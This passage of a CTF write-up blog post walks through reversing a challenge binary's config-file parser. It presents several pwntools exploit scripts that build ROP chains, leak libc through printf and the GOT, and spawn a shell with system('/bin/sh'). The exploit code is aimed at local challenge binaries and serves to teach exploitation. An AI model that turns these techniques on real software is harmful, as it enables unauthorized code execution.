</span></span><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>binsh</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>system</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0xd8</span> <span class=o>+</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Enter Note Below&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-13.png></p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-14.png>.jpg)</p><h2 id=user-input>User Input<a hidden class=anchor aria-hidden=true href=#user-input>#</a></h2><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-15.png></p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-16.png></p><p>Before start <strong>reversing</strong> the binary, let’s play a little with it.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-17.png></p><p>If executed the binary <strong>asks for</strong> <strong>config file</strong> as argument, so I crafted a config file with <strong>random values</strong> to see the binary <strong>behaviour</strong>.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-18.png></p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-19.png></p><p>Nothing useful from here, so <strong>let’s dive into reversing</strong> to get a better overview.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-20.png></p><p>The flow of the <code>main</code> function starts by checking whether <strong>enough arguments</strong> are provided or if the <strong>help option is included.</strong> If there aren’t enough arguments or the help option is specified, a <strong>help subroutine</strong> is called.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-21.png></p><p>If a <strong>config file</strong> is specified, it is opened, and the <strong>file descriptor</strong> along with a <strong>freshly malloced memory buffer</strong> are passed as arguments to <code>readFromFd</code>.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-22.png></p><p><code>readFromFd</code> makes a bunch of read from the <strong>fd</strong> into <strong>heap</strong>, leaking us the <strong>structure of the config file</strong>. To <strong>simplify</strong> the <strong>subroutine</strong>, I will let a simple diagram showcasing the <strong>structure</strong>.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-23.png></p><p>The diagram splits config file in <strong>sections</strong>, the <strong>blue addresses</strong> indicate where each section will be written, and on the left side of each section, in <strong>black</strong>, the <strong>size of that section</strong> is displayed.</p><p>First, we <strong>read two bytes</strong> from <code>fd</code>, which represent the size of the next read. The next read is placed directly in the <strong>heap</strong>, is worth to mention that only the <strong>last byte</strong> of the <strong>size is actually used</strong>.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-24.png></p><p>Then, <strong>two</strong> more <strong>bytes</strong> <strong>are read</strong>, which will be compared with the bytes <code>rR</code> stored in the <strong>data section</strong>.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-25.png></p><p>If the <strong>memory blocks</strong> <strong>aren’t identical</strong>, the function exits with <code>eax</code> equal to 0 (the return value is gonna be useful afterwards :P), if <strong>the blocks don’t differ</strong> then the function will still <strong>reading more bytes</strong> from <code>fd</code>.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-26.png></p><p>4 bytes are read into <code>[heap + 0x44]</code></p><p>Finally, we encounter a <strong>similar pattern</strong>, two bytes are read, indicating the size of the upcoming read, the <strong>next read</strong> is then <strong>stored</strong> into <code>[heap + 0x32]</code>.</p><p>This time the <code>eax</code> value is the <strong>signed extended addition</strong> of <code>(size1 + size2 + 0xC)</code></p><p>As mentioned before is very handy to have the diagram for <strong>clarifying the process.</strong></p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-27.png></p><p>Depending on the previously mentioned exit value, there are two possible execution paths. As we don’t have any clue of what this value is used for, let’s start with anyone</p><p>From this point, the <code>main</code> function starts to look <strong>quite overwhelming</strong>, with many different types of operations. In those cases, I like to search for <strong>vulnerable stuff</strong> first and try to understand in <strong>later stages</strong> (This has prevented me from falling into a lot of <strong>rabbit holes</strong>).</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-28.png></p><p>This <strong>block caught my attention</strong> because, it copies <code>exitVal</code> bytes from heap to <code>rsp</code> and calls the function saved at <code>[heap+0x48]</code> .</p><p>Since this is the path where the exit value equals <code>(size1 + size2 + 0xC)</code> and there is no modification of the heap on the process, <strong>we gain a write primitive</strong> to <code>rsp</code> and <strong>the ability to call a function of our choice</strong>. These are all the ingredients needed to achieve <strong>code execution.</strong></p><p>So let’s outline a plan, the main idea is taking advantage of <strong>stack write primitive</strong> by writing the <strong>ROP chain</strong> in the heap as later will be copied into <code>rsp</code> and place a <strong>pointer to a function</strong> on the position <code>[heap+0x48]</code> so execution returns directly to <code>rsp</code>.</p><p>This is how should look our <strong>config file.</strong></p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-29.png></p><p>In order to craft a proper <strong>ROP chain</strong> to call <code>system</code> and <strong>spawn a shell</strong>, a <strong>libc leak</strong> will be needed, we can achieve that invoking <code>printf</code> from the <strong>PLT</strong> and passing a <strong>populated GOT entry</strong> as the first argument (in our case, I used <code>read</code>).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>exe</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rdi&#39;</span><span class=p>,</span> <span class=s1>&#39;ret&#39;</span><span class=p>])</span><span class=o>.</span><span class=n>address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>read</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>printf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x401764</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pad</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x32</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x16</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x32</span><span class=p>)</span> <span class=o>+</span> <span class=n>pad</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;rR&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x4</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x1e</span><span class=p>)</span> <span class=o>+</span> <span class=n>heap</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>config_path</span> <span class=o>=</span> <span class=s2>&#34;config_file_path&#34;</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>config_path</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
</span></span></code></pre></div><p>The binary gadget <code>pop_rdi</code> is placed into <code>[heap+0x48]</code> so execution returns directly to <code>rsp</code>. Is worth to mention that the end of our <strong>ROP chain</strong> loops back to <code>copyFromFd</code> in <code>main</code>, allowing us to repeat the attack.</p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-30.png></p><p>Nicee we got a <strong>libc leak</strong>, let’s place the actual <strong>ROP chain</strong> to <strong>spawn a shell,</strong> appending the new <strong>config file</strong> to the existing file will do the trick.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./challenge_2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;tmux&#34;</span><span class=p>,</span> <span class=s2>&#34;splitw&#34;</span><span class=p>,</span> <span class=s2>&#34;-h&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gdbscript</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>start
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>exe</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rdi&#39;</span><span class=p>,</span> <span class=s1>&#39;ret&#39;</span><span class=p>])</span><span class=o>.</span><span class=n>address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>read</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>printf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x401764</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pad</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x32</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x16</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x32</span><span class=p>)</span> <span class=o>+</span> <span class=n>pad</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;rR&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x4</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x1e</span><span class=p>)</span> <span class=o>+</span> <span class=n>heap</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>config_path</span> <span class=o>=</span> <span class=s2>&#34;config_file_path&#34;</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>config_path</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>([</span><span class=n>config_path</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x10e1e0</span>
</span></span><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>binsh</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>system</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pad</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x32</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x16</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x32</span><span class=p>)</span> <span class=o>+</span> <span class=n>pad</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;rR&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x4</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span> <span class=o>+</span> <span class=n>heap</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-31.png></p><p>As expected the <strong>binary finishes execution</strong> before we can append the <strong>second stage</strong> to the config file. To keep it alive long enough, we need to prevent it from exiting. For this reason, I chose to <strong>repeat</strong> the first stage <strong>10,000 times</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./challenge_2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;tmux&#34;</span><span class=p>,</span> <span class=s2>&#34;splitw&#34;</span><span class=p>,</span> <span class=s2>&#34;-h&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gdbscript</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>start
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>exe</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rdi&#39;</span><span class=p>,</span> <span class=s1>&#39;ret&#39;</span><span class=p>])</span><span class=o>.</span><span class=n>address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>read</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>printf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x401764</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pad</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x32</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x16</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x32</span><span class=p>)</span> <span class=o>+</span> <span class=n>pad</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;rR&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x4</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x1e</span><span class=p>)</span> <span class=o>+</span> <span class=n>heap</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>config_path</span> <span class=o>=</span> <span class=s2>&#34;config_file_path&#34;</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>config_path</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>([</span><span class=n>config_path</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x10e1e0</span>
</span></span><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>binsh</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>system</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pad</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x32</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x16</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x32</span><span class=p>)</span> <span class=o>+</span> <span class=n>pad</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;rR&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x4</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span> <span class=o>+</span> <span class=n>heap</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-32.png></p><p><img alt=Untitled loading=lazy src=/CTF/interruptlabsctf-33.png></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/pwn/>Pwn</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://pwndside.github.io/>PwndSide</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
